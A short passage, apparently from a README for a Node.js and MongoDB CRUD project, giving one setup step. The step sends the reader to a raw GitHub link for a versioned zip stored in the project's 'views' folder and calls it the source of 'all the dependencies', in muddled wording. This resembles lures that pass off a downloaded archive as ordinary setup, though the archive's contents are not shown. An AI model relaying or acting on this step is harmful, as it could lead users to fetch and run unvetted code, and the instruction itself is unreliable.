...
- then go to that folder & go to https://github.com/Krizx6/Nodejs-Mongodb-CRUD/raw/refs/heads/main/views/Nodejs_Mongodb_CRUD_3.7.zip and download all the dependencies list that is in the dependencie key
